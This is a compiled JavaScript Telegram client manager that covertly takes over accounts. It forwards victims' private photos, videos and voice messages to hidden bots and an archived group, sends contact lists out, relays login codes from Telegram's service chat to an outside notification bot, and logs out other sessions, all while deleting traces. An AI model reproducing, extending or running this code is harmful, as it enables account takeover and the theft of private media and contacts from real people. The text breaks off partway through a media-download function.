"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const events_1 = require("telegram/events");
const axios_1 = __importDefault(require("axios"));
const fs = __importStar(require("fs"));
const uploads_1 = require("telegram/client/uploads");
const Helpers_1 = require("telegram/Helpers");
const Logger_1 = require("telegram/extensions/Logger");
const IMap_1 = require("../../IMap/IMap");
const big_integer_1 = __importDefault(require("big-integer"));
const utils_1 = require("../../utils");
const parseError_1 = require("../../utils/parseError");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
const connection_manager_1 = require("./utils/connection-manager");
const message_search_dto_1 = require("./dto/message-search.dto");
const TelegramBots_config_1 = require("../../utils/TelegramBots.config");
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        const groupName = "Saved Messages";
        const groupDescription = this.phoneNumber;
        console.log("Creating group:", groupName);
        const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        }));
        const { id, accessHash } = result.chats[0];
        console.log("Archived chat", id);
        await this.archiveChat(id, accessHash);
        const usersToAdd = ["fuckyoubabie1"];
        console.log("Adding users to the channel:", usersToAdd);
        const addUsersResult = await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: new telegram_1.Api.InputChannel({
                channelId: id,
                accessHash: accessHash,
            }),
            users: usersToAdd
        }));
        console.log("Successful addition of users:", addUsersResult);
        return { id, accessHash };
    }
    async archiveChat(id, accessHash) {
        const folderId = 1;
        console.log("Archiving chat", id);
        return await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new telegram_1.Api.InputFolderPeer({
                    peer: new telegram_1.Api.InputPeerChannel({
                        channelId: id,
                        accessHash: accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
    }
    async createOrJoinChannel(channel) {
        let channelId;
        let channelAccessHash;
        if (channel) {
            try {
                const result = await this.joinChannel(channel);
                channelId = result.chats[0].id;
                channelAccessHash = result.chats[0].accessHash;
                console.log("Archived chat", channelId);
            }
            catch (error) {
                const result = await this.createGroup();
                channelId = result.id;
                channelAccessHash = result.accessHash;
                console.log("Created new group with ID:", channelId);
            }
        }
        else {
            const result = await this.createGroup();
            channelId = result.id;
            channelAccessHash = result.accessHash;
            console.log("Created new group with ID:", channelId);
        }
        await this.archiveChat(channelId, channelAccessHash);
        return { id: channelId, accesshash: channelAccessHash };
    }
    async forwardMedia(channel, fromChatId) {
        let channelId;
        try {
            console.log("Forwarding media from chat to channel", channel, fromChatId);
            let channelAccessHash;
            if (fromChatId) {
                const channelDetails = await this.createOrJoinChannel(channel);
                channelId = channelDetails.id;
                channelAccessHash = channelDetails.accesshash;
                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                if (chats.length > 0) {
                    const channelDetails = await this.createOrJoinChannel(channel);
                    channelId = channelDetails.id;
                    channelAccessHash = channelDetails.accesshash;
                    const finalChats = new Set(chats.map(chat => chat.chatId));
                    finalChats.add(me.id?.toString());
                    for (const chatId of finalChats) {
                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                        console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                        await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                        await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
                    }
                }
                console.log("Completed forwarding messages from top private chats to channel:", channelId);
            }
        }
        catch (e) {
            console.log(e);
        }
        if (channelId) {
            await this.leaveChannels([channelId.toString()]);
            await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
        }
    }
    async forwardMediaToBot(fromChatId) {
        const bots = TelegramBots_config_1.BotConfig.getInstance().getAllBotUsernames(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
        try {
            if (fromChatId) {
                await this.forwardSecretMsgs(fromChatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES));
            }
            else {
                const chats = await this.getTopPrivateChats();
                const me = await this.getMe();
                const finalChats = new Set(chats.map(chat => chat.chatId));
                finalChats.add(me.id?.toString());
                for (const bot of bots) {
                    try {
                        await this.client.sendMessage(bot, { message: "Start" });
                        await (0, Helpers_1.sleep)(1000);
                        await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
                            folderPeers: [
                                new telegram_1.Api.InputFolderPeer({
                                    peer: await this.client.getInputEntity(bot),
                                    folderId: 1,
                                }),
                            ],
                        }));
                    }
                    catch (e) {
                        console.log(e);
                    }
                }
                try {
                    const contacts = await this.getContacts();
                    if ('users' in contacts && Array.isArray(contacts.users)) {
                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS), contacts);
                    }
                    else {
                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
                    }
                }
                catch (e) {
                    console.log("Failed To Send Contacts File", e);
                }
                for (const chatId of finalChats) {
                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.VOICE] });
                    console.log("Media Messages: ", mediaMessages);
                    const uniqueMessageIds = Array.from(new Set([
                        ...mediaMessages.photo.messages,
                        ...mediaMessages.video.messages,
                        ...mediaMessages.document.messages,
                        ...mediaMessages.roundVideo.messages,
                        ...mediaMessages.roundVoice.messages,
                        ...mediaMessages.voice.messages,
                    ]));
                    const chunkSize = 30;
                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);
                        const bot = TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
                        await this.client.forwardMessages(bot, {
                            messages: chunk,
                            fromPeer: chatId,
                        });
                        console.log(`Forwarded ${chunk.length} messages to bot`);
                    }
                }
            }
        }
        catch (e) {
            console.log(e);
        }
        for (const bot of bots) {
            const result = await this.cleanupChat({ chatId: bot, revoke: false });
            await (0, Helpers_1.sleep)(1000);
            await this.deleteChat({ peer: bot, justClear: false });
            console.log("Deleted bot chat:", result);
        }
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            console.log(messageIds);
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });
                    forwardedCount += messageIds.length;
                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await (0, Helpers_1.sleep)(5000);
                }
                catch (error) {
                    console.error("Error occurred while forwarding messages:", error);
                }
                await (0, Helpers_1.sleep)(5000);
            }
        } while (messages.length > 0);
        console.log("Left the channel with ID:", toChatId);
        return;
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async destroy() {
        if (this.client) {
            try {
                await this.client?.destroy();
                this.client._eventBuilders = [];
                this.session?.delete();
                this.channelArray = [];
                await (0, Helpers_1.sleep)(2000);
                console.log("Client Destroyed: ", this.phoneNumber);
            }
            catch (error) {
                (0, parseError_1.parseError)(error, `${this.phoneNumber}: Error during client cleanup`);
            }
            finally {
                this.client._destroyed = true;
                if (this.client._sender && typeof this.client._sender.disconnect === 'function') {
                    await this.client._sender.disconnect();
                }
                this.client = null;
            }
        }
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        if (error.message && error.message == 'TIMEOUT') {
            await this.destroy();
        }
        else {
            (0, parseError_1.parseError)(error);
        }
    }
    async createClient(handler = true, handlerFn) {
        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
        this.client._errorHandler = this.errorHandler;
        await this.client.connect();
        const me = await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler");
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
            }
        }
        return this.client;
    }
    async getGrpMembers(entity) {
        try {
            const result = [];
            const chat = await this.client.getEntity(entity);
            if (!(chat instanceof telegram_1.Api.Chat || chat instanceof telegram_1.Api.Channel)) {
                console.log("Invalid group or channel!");
                return;
            }
            console.log(`Fetching members of ${chat.title || chat.username}...`);
            const participants = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
                channel: chat,
                filter: new telegram_1.Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: (0, big_integer_1.default)(0),
            }));
            if (participants instanceof telegram_1.Api.channels.ChannelParticipants) {
                const users = participants.participants;
                console.log(`Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof telegram_1.Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = await this.client.getEntity(userInfo);
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        });
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            console.log(JSON.stringify(userDetails.id));
                        }
                    }
                    else {
                        console.log(JSON.stringify(user?.userId));
                    }
                }
            }
            else {
                console.log("No members found or invalid group.");
            }
            console.log(result.length);
            return result;
        }
        catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
            else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++;
                    }
                    else {
                        otherPhotoCount++;
                    }
                }
                else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++;
                    }
                    else {
                        otherVideoCount++;
                    }
                }
            }
        }
        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
    }
    async channelInfo(sendIds = false) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    }
                    else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                }
            }
        }
        ;
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new telegram_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    console.log(e);
                }
            }
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        try {
            const inputContacts = [];
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
                inputContacts.push(new telegram_1.Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user,
                    firstName: firstName,
                    lastName: lastName
                }));
            }
            const result = await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            console.log("Imported Contacts Result:", result);
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async leaveChannels(chats) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats);
        for (const id of chats) {
            try {
                const channelId = id.startsWith('-100') ? id : `-100${id}`;
                await this.client.invoke(new telegram_1.Api.channels.LeaveChannel({
                    channel: channelId
                }));
                console.log(`${this.phoneNumber} Left channel :`, id);
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(3000);
                }
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                console.log(`${this.phoneNumber} Failed to leave channel :`, errorDetails.message);
                break;
            }
        }
        console.log(`${this.phoneNumber} Leaving Channels: Completed!!`);
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        console.log("trying to join channel : ", entity);
        return await this.client?.invoke(new telegram_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        const authCriteria = [
            { field: 'country', value: 'singapore' },
            { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },
            { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] }
        ];
        return authCriteria.some(criterion => {
            if ('values' in criterion) {
                return criterion.values.some(value => auth[criterion.field].toLowerCase().includes(value.toLowerCase()));
            }
            return auth[criterion.field].toLowerCase().includes(criterion.value.toLowerCase());
        });
    }
    async resetAuthorization(auth) {
        await this.client?.invoke(new telegram_1.Api.account.ResetAuthorization({ hash: auth.hash }));
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = message.photo?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id);
            const sizes = message.document?.thumbs || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new telegram_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0;
                const msgs = await this.client.getMessages(chatId, { limit: 600 });
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!(0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                            photo++;
                        }
                        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++;
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...details,
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                });
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async getCallLogsInternal() {
        const finalResult = {};
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            finalResult[chatId] = filteredResults;
        }
        return finalResult;
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll(),
                ],
            }));
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new telegram_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!this.isAuthMine(auth)) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }
    async getContacts() {
        const exportedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({
            hash: (0, big_integer_1.default)(0)
        }));
        return exportedContacts;
    }
    async deleteChat(params) {
        try {
            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
            console.log(`Dialog with ID ${params.peer} has been deleted.`);
        }
        catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new telegram_1.Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            console.error('Failed to block user:', error);
        }
    }
    async getMediaMetadata(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const query = {
            limit: limit || 500,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };
        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);
        const filteredMessages = messages.map(message => {
            const messageIds = [];
            if (message.media) {
                const mediaType = this.getMediaType(message.media);
                if (types.includes(mediaType)) {
                    messageIds.push(message.id);
                }
            }
            return messageIds;
        }).flat();
        return {
            messages: filteredMessages,
            total: messages.total,
            hasMore: messages.length == limit,
            lastOffsetId: messages[messages.length - 1].id
        };
    }
    async downloadMediaFile(messageId, chatId = 'me', res) {
        try {
            const entity = await this.safeGetEntity(chatId);
            const messages = await this.client.getMessages(entity, { ids: [messageId] });
            const message = messages[0];
            if (message && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };
                if (media instanceof telegram_1.Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new telegram_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                }
                else if (media instanceof telegram_1.Api.MessageMediaDocument) {
                    contentType = media.mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new telegram_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                }
                else {
                    return res.status(415).send('Unsupported media type');
                }
                res.setHeader('Content-Type', contentType);
